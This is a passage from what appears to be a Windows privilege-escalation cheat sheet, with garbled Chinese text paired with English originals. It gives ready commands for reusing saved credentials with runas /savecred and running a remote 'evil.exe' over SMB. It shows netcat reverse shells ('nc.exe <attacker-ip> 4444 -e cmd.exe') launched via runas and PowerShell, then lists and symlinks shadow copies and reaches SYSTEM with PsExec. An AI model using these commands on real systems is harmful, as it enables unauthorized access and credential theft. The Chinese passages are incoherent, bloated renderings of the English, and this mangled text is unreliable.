你可以通过借用并且在此基础配合附加上具备并能够携带使用参数选项中具有 `/savecred` 的运行特性或附带有此功能的特有操作特性去完成借用来运行以使得去把先前这上面在系统中被记录并且存储保存着被当去能够再次供于连接等动作可被加以在调用中在后台直接以非再次明面所要求就进行等操作来配合进行并能借助已经具有被存留下来相关账号凭证密码权限来去配合使得在这其中用来以此借予进行达到在不需要再一次地去被询问与提供该执行的口令等这类凭证之下就顺利能去展开获取拥有和使用该级别使用资格的操作或动作。(Then you can use `runas` with the `/savecred` options in order to use the saved credentials.)
在这个接下来用于演示的方法里你可以看到如何调用处在使用远端的服务器环境存储所保留并且暴露出的 SMB 共享里的有关被用以能够破坏等目的执行程序来获得以及执行的方法方式等相关的情况如下面所举出来的展现的通过访问并且调用在这在另外的网络端存储中以这种能被通过验证通过等渠道下能调用启动在另外设备上存放可执行的文件程序操作一样的方式过程效果的演示例子： (The following example is calling a remote binary via an SMB share.)

```powershell
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
runas /savecred /user:Administrator "cmd.exe /k whoami"
```

这展示了另外在使用 `runas` 这一具有特定条件支持使用其在带有预先需要所具有去输入与提交提供指定的认证记录的条件下才可配合以此被通过并且被认可去使用执行命令的被执行的方法 (Using `runas` with a provided set of credential.)

```powershell
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

```powershell
$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
```

## 权限提升 - 滥用卷影副本 (EoP - Abusing Shadow Copies)

如果你发现当前正在操作和被利用且具有或者存在相关的环境控制中在此所进行的设备里如果有可以使得自身能够具备着作为在对该所在机器具有系统操作内可以实施控制能取得能有着进行具有管理员权利及功能角色的等拥有级别下的可进行的等有这方面同等层级的本地管理执行系统指令等的控制利用这等系统级别权限的的话就建议能够同时在这当中可以试着去将其在这环境下有相关能保留有作为记录能够回溯的或者是针对这方面存在能对整个具有能进行拷贝留有记录的相关等这些存在备份存储信息里头被用来做保留并进行储存可对过去的存留历史记录档案也就是这个的影子副本内容进行一些查看或者获取去列举出来、发现是否有这样可以供以读取、这在用于发现更多内容中将会成为在这个情况中一个非常方便并可以加以能被用于且有比较简单轻易等可作为拿去进行使得通过得到具有这种在相关内部得到更加突破性与获得更高层级进行系统方面被用作作为相关漏洞与可用来实现和进行权力晋升也就是我们常说的特权攀升或漏洞获取用来升权这一阶段所去展开这等过程操作的很轻松的一个途径。 (If you have local administrator access on a machine try to list shadow copies, it's an easy way for Privilege Escalation.)

```powershell
# 通过利用拥有管理员在操作系统管理环境下具备执行许可或同等级别要求以及具有足够能够被用于可调用命令的操作环境与条件这等相关能力下，使得调用并借由使用 vssadmin 命令服务并用以展示以及用来检查并获取当前相关环境中被保留并存在的系统的有关于影子这部分备份副本记录列表。 (List shadow copies using vssadmin (Needs Admnistrator Access))
vssadmin list shadows
  
# 使用系统自带另外一种在针对相关处理以及管理这种等存储等这类操作命令程序（也就是 diskshadow）一样可以通过其进行对这等部分同样内容所具有相关的这种影子的内容复制保存进行相关存在所保留这等被备份下来所被包含的列单展示以去取得相关包含记录的内容查找与检查的操作。 (List shadow copies using diskshadow)
diskshadow list shadows all
  
# 利用通过所被给予具有的能够在指定位置下构建一个拥有和原位置目标能有关联且能够在后续借此进行访问等相关带有这类如同真实文件夹一般具有联系指引的一个被称为用于在这系统中被用作为符号链接（或者是指向）这类手段，使得能在后面可以通过以此所对应建立这这部分去对能够进入并去达到在这存在这部分的等相关在这进行相关这些具有存放这类备份的影子副本的信息当中，以此这就可以能够进行这后面在所指向等进行存并进行获得访问其这部分所具有相关里面所存储这等相关内容的这个过程及结果（创建到影子副本的符号链接并访问它） (Make a symlink to the shadow copy and access it)
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

## 权限提升 - 从本地管理员到 NT SYSTEM (EoP - From local administrator to NT SYSTEM)

```powershell
PsExec.exe -i -s cmd.exe
```
